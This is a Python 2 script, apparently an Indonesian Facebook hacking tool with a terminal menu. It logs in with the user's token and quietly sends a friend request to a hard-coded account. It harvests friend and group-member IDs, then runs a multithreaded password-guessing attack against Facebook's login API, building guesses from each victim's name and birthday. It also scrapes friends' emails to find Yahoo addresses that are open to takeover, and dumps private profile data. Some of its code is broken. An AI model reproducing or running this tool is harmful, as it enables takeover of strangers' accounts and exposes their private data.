# -*- coding: utf-8 -*-
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[1;91m[!] Keluar'
    os.sys.exit()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r     \x1b[1;91m[+] \x1b[1;92mPlease Wait \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

logo = " \x1b[1;36m ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\n \x1b[1;31m _  _ _  _ _    ___ _ ___  ____ ____ ____ ____ ____\n \x1b[1;31m |\\/| |  | |     |  | |__] |___ |  | |__/ |    |___\n \x1b[1;37m |  | |__| |___  |  | |__] |    |__| |  \\ |___ |___\n \x1b[1;36m «------------------------✧✧-----------------------»\n  \x1b[91m[\x1b[97m+\x1b[91m] \x1b[37mAuthor    : \x1b[92mTio Putra JK\n  \x1b[91m[\x1b[97m+\x1b[91m] \x1b[37mFacebook  : \x1b[92mTio Evanka\n  \x1b[91m[\x1b[97m+\x1b[91m] \x1b[37mGithub    : \x1b[92mhttps://github.com/tioce"


back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
idteman = []
idfromteman = []
idmem = []
id = []
idtm = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

def login():
    os.system('reset')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('reset')
        os.system('sh 1.sh')
        id = raw_input('     \x1b[1;91m[+] \x1b[1;36mUsername \x1b[1;91m:\x1b[1;92m ')
        pwd = raw_input('     \x1b[1;91m[+] \x1b[1;36mPassword \x1b[1;91m:\x1b[1;92m ')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n     \x1b[1;91m[!] Tidak ada koneksi'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                zedd = open('login.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
	        jalan('\n     \x1b[1;91m[+] \x1b[1;93mLogin Sukses')
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                time.sleep(2)
                menu()
            except requests.exceptions.ConnectionError:
                print '\n     \x1b[1;91m[!] Tidak ada koneksi'
                keluar()

        if 'checkpoint' in url:
            print '\n     \x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n     \x1b[1;91m[!] Login Gagal'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            nama = a['name']
            id = a['id']
        except KeyError:
            os.system('reset')
            print '\x1b[1;91m[!] \x1b[1;93mSepertinya akun kena Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[!] Tidak ada koneksi'
            keluar()

        os.system('reset')
        ji = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        ha = json.loads(ji.text)
        for c in ha["data"]:
            idtm.append(c["id"])
        os.system('sh logo.sh')
	print ' \x1b[91m╔══════════════════════════════════════════════════╗'
        print'              \x1b[91m[\x1b[97m+\x1b[91m] \x1b[37m Name :\x1b[32m' + nama
	print'              \x1b[91m[\x1b[97m+\x1b[91m] \x1b[37m ID :\x1b[32m ' + id
	print'              \x1b[91m[\x1b[97m+\x1b[91m] \x1b[37m Jumlah ID :\x1b[32m ' + str(len(idtm))
	print ' \x1b[91m╚══════════════════════════════════════════════════╝'       
        print ' \x1b[37m1. User Information' 
        print ' \x1b[37m2. Hack Facebook Teman'
        print ' \x1b[37m3. Ambil Id Teman'
        print ' \x1b[37m4. Yahoo Checker'
        print ' \x1b[37m5. Liat Tanggal Lahir'
	print ' \x1b[37m6. Ambil Id grub'
        print ' \x1b[37m7. Logout'
        print ' \x1b[37m0. Exit'
	print
        pilih()

def pilih():
    zedd = raw_input('\x1b[1;32mSelect \xe2\x96\xba\x1b[1;97m ')
    if zedd == '':
        print '\x1b[1;91m[!] Jangan kosong'
        pilih()
    else:
        if zedd == '1':
            informasi()
        else:
            if zedd == '2':
                super()
	    else:
                if zedd == '3':
                   id_friends()
                else:
                    if zedd == '4':
                       menu_yahoo()
		    else:
                        if zedd == '5':
                           getlahir()	
			else:
                            if zedd == '6':
                               lain()
		            else:
                                if zedd == '7':
                                   os.system("rm -rf login.txt")
				   keluar()
                                else:
                                     if zedd == '0':
                                        keluar()
                                     else:
                                          print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + zedd + ' \x1b[1;91mTidak ada'
                                          pilih()

def informasi():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    os.system('sh logo.sh')
    print ' \x1b[91m════════════════════════════════════════════════════'
    id = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID\x1b[1;97m/\x1b[1;92mNama\x1b[1;91m : \x1b[1;97m')
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    cok = json.loads(r.text)
    for p in cok['data']:
        if id in p['name'] or id in p['id']:
            r = requests.get('https://graph.facebook.com/' + p['id'] + '?access_token=' + toket)
            z = json.loads(r.text)
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            try:
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama\x1b[1;97m          : ' + z['name']
            except KeyError:
                print '\x1b[1;91m[?] \x1b[1;92mNama\x1b[1;97m          : \x1b[1;91mTidak ada'
            else:
                try:
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID\x1b[1;97m            : ' + z['id']
                except KeyError:
                    print '\x1b[1;91m[?] \x1b[1;92mID\x1b[1;97m            : \x1b[1;91mTidak ada'
                else:
                    try:
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail\x1b[1;97m         : ' + z['email']
                    except KeyError:
                        print '\x1b[1;91m[?] \x1b[1;92mEmail\x1b[1;97m         : \x1b[1;91mTidak ada'
                    else:
                        try:
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNomor HP\x1b[1;97m      : ' + z['mobile_phone']
                        except KeyError:
                            print '\x1b[1;91m[?] \x1b[1;92mNomor HP\x1b[1;97m      : \x1b[1;91mTidak ada'

                        try:
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mLokasi\x1b[1;97m        : ' + z['location']['name']
                        except KeyError:
                            print '\x1b[1;91m[?] \x1b[1;92mLokasi\x1b[1;97m        : \x1b[1;91mTidak ada'

                    try:
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mTanggal Lahir\x1b[1;97m : ' + z['birthday']
                    except KeyError:
                        print '\x1b[1;91m[?] \x1b[1;92mTanggal Lahir\x1b[1;97m : \x1b[1;91mTidak ada'

                try:
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mSekolah\x1b[1;97m       : '
                    for q in z['education']:
                        try:
                            print '\x1b[1;91m                   ~ \x1b[1;97m' + q['school']['name']
                        except KeyError:
                            print '\x1b[1;91m                   ~ \x1b[1;91mTidak ada'

                except KeyError:
                    pass

            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()
    else:
        print '\x1b[1;91m[\xe2\x9c\x96] Pengguna tidak ditemukan'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        menu()

def super():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    os.system('sh logo.sh')
    print ' \x1b[91m════════════════════════════════════════════════════'
    print '\x1b[1;91m[\x1b[32m1\x1b[91m]\x1b[1;34m Daftar Teman'
    print '\x1b[1;91m[\x1b[32m2\x1b[91m]\x1b[1;34m Daftar Teman Ke teman'
    print '\x1b[1;91m[\x1b[32m3\x1b[91m]\x1b[1;34m Member Grup'
    print '\x1b[1;91m[\x1b[32m4\x1b[91m]\x1b[1;34m Crack from File'
    print '\x1b[1;91m[\x1b[32m0\x1b[91m]\x1b[1;31m Kembali'
    pilih_super()


def pilih_super():
    peak = raw_input('\x1b[1;32mSelect \xe2\x96\xba\x1b[1;97m ')
    if peak == '':
        print '\x1b[1;91m[!] Jangan kosong'
        pilih_super()
    else:
        if peak == '1':
            os.system('reset')
            os.system('sh logo.sh')
            print '\x1b[91m════════════════════════════════════════════════════'  
            jalan('\x1b[1;91m[+]\x1b[1;32m Mengambil id teman ...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        else:
            if peak == '3':
                os.system('reset')
                os.system('sh logo.sh')
                print '\x1b[91m════════════════════════════════════════════════════'
                idg = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID Grup   \x1b[1;91m:\x1b[1;97m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
                except KeyError:
                    print '\x1b[1;91m[!] Grup tidak ditemukan'
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                    super()

                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=9999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id.append(i['id'])
	    else:
                if peak == '4':
                   os.system('reset')
                   os.system('sh logo.sh')
                   print '\x1b[91m════════════════════════════════════════════════════'
		   try:
                      idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile ID  \x1b[1;91m: \x1b[1;97m')
                      for line in open(idlist,'r').readlines():
                               id.append(line.strip())
                   except IOError:
                       print '\x1b[1;91m[!] File not found'
                       raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                       super()
                else:
		    if peak == '2':
                       os.system('reset')
                       os.system('sh logo.sh')
                       print '\x1b[91m════════════════════════════════════════════════════'
                       idt = raw_input('\x1b[1;91m[+] \x1b[1;92mID Friends   \x1b[1;91m:\x1b[1;97m ')
                       try:
	                  r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                          asw = json.loads(r.text)
                          print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName Friends \x1b[1;91m:\x1b[1;97m ' + asw['name']
                       except KeyError:
                           print '\x1b[1;91m[!] Friends not found'
                           raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                           super()
                       r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
                       z = json.loads(r.text)
                       for s in z['friends']['data']:
                           id.append(s['id'])
	                   nama = s['name'] 

                    else:
                        if peak == '0':
                           menu()
                        else:
                            print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'
                            pilih_super()
    print '\x1b[1;91m[+] \x1b[1;92mID Berhasil Di Ambil \x1b[1;91m: \x1b[1;97m' + str(len(id))
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\r\x1b[1;91m[+] \x1b[1;92mPlease Wait \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)
    
    print
    os.system('sh status.sh')

    def main(arg):
        user = arg
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = 'sayang'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ''[' + user + '] [ ' + pass1 + ' ] ==>  ' + b['name']
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ''[' + user + '] [ ' + pass1 + ' ] ==> ' + b['name']
                else:
                    pass2 = 'Doraemon'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ''[' + user + '] [ ' + pass2 + ' ] ==> ' + b['name']
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ''[' + user + '] [ ' + pass2 + ' ] ==> ' + b['name']
	                else:
                            pass3 = b['first_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ''[' + user + '] [ ' + pass3 + ' ] ==> ' + b['name']
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ''[' + user + '] [ ' + pass3 + ' ] ==> ' + b['name']
                                else:
                                     pass4 = b['name']
                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                     q = json.load(data)
                                     if 'access_token' in q:
                                         print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ''[' + user + '] [ ' + pass4 + ' ] ==> ' + b['name']
                                     else:
                                          if 'www.facebook.com' in q['error_msg']:
                                             print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ''[' + user + '] [ ' + pass4 + ' ] ==> ' + b['name']
					  else:
                                               pass5 = b['last_name'] + '123'
                                               data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                               q = json.load(data)
                                               if 'access_token' in q:
                                                   print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ''[' + user + '] [ ' + pass5 + ' ] ==> ' + b['name']
                                               else:
                                                   if 'www.facebook.com' in q['error_msg']:
                                                       print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ''[' + user + '] [ ' + pass5 + ' ] ==> ' + b['name']
					           else:
                                                        pass6 = b['first_name'] + '12345'
                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                        q = json.load(data)
                                                        if 'access_token' in q:
                                                             print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ''[' + user + '] [ ' + pass6 + ' ] ==> ' + b['name']
                                                        else:
                                                            if 'www.facebook.com' in q['error_msg']:
                                                                print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ''[' + user + '] [ ' + pass6 + ' ] ==> ' + b['name']
							    else:
                                                                 pass7 = b['last_name'] + '12345'
                                                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                 q = json.load(data)
                                                                 if 'access_token' in q:
                                                                     print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ''[' + user + '] [ ' + pass7 + ' ] ==> ' + b['name']
                                                                 else:
                                                                     if 'www.facebook.com' in q['error_msg']:
                                                                         print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ''[' + user + '] [ ' + pass7 + ' ] ==> ' + b['name']
							             else:
									 pass8 = anjing
                                                                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                         q = json.load(data)
                                                                         if 'access_token' in q:
                                                                             print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ''[' + user + '] [ ' + pass8 + ' ] ==> ' + b['name']
                                                                         else:
                                                                             if 'www.facebook.com' in q['error_msg']:
                                                                                 print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ''[' + user + '] [ ' + pass8 + ' ] ==> ' + b['name']
									     else:
                                                                                 lahir = b['birthday']
									         pass9 = lahir.replace('/', '')
                                                                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                 q = json.load(data)
                                                                                 if 'access_token' in q:
                                                                                     print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ''[' + user + '] [ ' + pass9 + ' ] ==> ' + b['name']
                                                                                 else:
                                                                                     if 'www.facebook.com' in q['error_msg']:
                                                                                         print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ''[' + user + '] [' + pass9 + '] ==> ' + b['name']
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    super()

def id_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            os.system('sh logo.sh')
            print ' \x1b[91m════════════════════════════════════════════════════'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            jalan(' \x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print ' \x1b[97m════════════════════════════════════════════════════'
            for ah in z['data']:
                id.append(ah['id'])
                print '\r\x1b[1;92m Name\x1b[1;91m  :\x1b[1;97m ' + ah['name']
                print '\x1b[1;92m ID   \x1b[1;91m : \x1b[1;97m' + ah['id']
                print ' \x1b[97m════════════════════════════════════════════════════'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(id)
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()

def menu_yahoo():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    os.system('sh logo.sh')
    print ' \x1b[91m════════════════════════════════════════════════════'
    print ' \x1b[37m1. From Friends'
    print ' \x1b[37m2. Friends from Friends'
    print ' \x1b[37m3. Member Grup'
    print ' \x1b[37m4. From file'
    print ' \x1b[31m0. Back'
    print 
    yahoo_pilih()

def yahoo_pilih():
    go = raw_input('\x1b[1;32mSelect \xe2\x96\xba\x1b[1;97m ')
    if go == '':
        print '\x1b[1;91m[!] Jangan kosong'
        yahoo_pilih()
    elif go == '1':
           yahoofriends()
    elif go == '2':
           yahoo()
    elif go == '3':
           yahoomember()
    elif go == '4':
           yahoolist()
    elif go == '0':
            menu()
    else:
         print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + go + ' \x1b[1;91mTidak ada'
         yahoo_pilih()

def yahoomember():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token tidak ditemukan"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('reset')
	os.system('sh logo.sh')
	mpsh = []
	jml = 0
	id=raw_input('[+] Masukkan ID group : ')
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
		asw=json.loads(r.text)
		print"[+] Nama Grup : "+asw['name']
	except KeyError:
		print"[!] Group tidak ditemukan"
		raw_input("\n[ Back ]")
		menu_yahoo()
	jalan('[+] Mengambil Email Grup ...')
	teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
	kimak = json.loads(teman.text)
	save = open('GrupVuln.txt','w')
	jalan('[+] Mulai ...')
	print 40 * '\x1b[1;97m\xe2\x95\x90'
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write(mail + '\n')
					print("[ VULN ] " +mail+" = "+nama)
					berhasil.append(mail)
		except KeyError:
			pass

	print 40 * '\x1b[1;97m\xe2\x95\x90'
	print 'Done'
	print"+] Tersimpan :GrupVuln.txt"
	save.close()
	raw_input("\n[ Back ]")
	menu_yahoo()
	
	

def yahoo():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    os.system('sh logo.sh')
    print ' \x1b[91m════════════════════════════════════════════════════'
    print ' Segera hadir'
    raw_input("\033[34m[\033[33;1m/\033[34m] \033[0;1mBack >> ")
    menu_yahoo()

def yahoofriends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    os.system('sh logo.sh')
    print ' \x1b[91m════════════════════════════════════════════════════'
    mpsh = []
    jml = 0
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('MailVuln.txt', 'w')
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print 40 * '\x1b[1;97m\xe2\x95\x90'
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + nama
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + id
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;97m ' + mail + ' [\x1b[1;92m' + vuln + '\x1b[1;97m]'
                    print 40 * '\x1b[1;97m\xe2\x95\x90'
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
        except KeyError:
            pass

    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m:\x1b[1;97m MailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    menu_yahoo()


def yahoolist():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('sh logo.sh')
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        files = raw_input('\x1b[1;91m[+] \x1b[1;92mFile \x1b[1;91m: \x1b[1;97m')
        try:
            total = open(files, 'r')
            mail = total.readlines()
        except IOError:
            print '\x1b[1;91m[!] File tidak ada'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_yahoo()

    mpsh = []
    jml = 0
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
    save = open('MailVuln.txt', 'w')
    print 40 * '\x1b[1;97m\xe2\x95\x90'
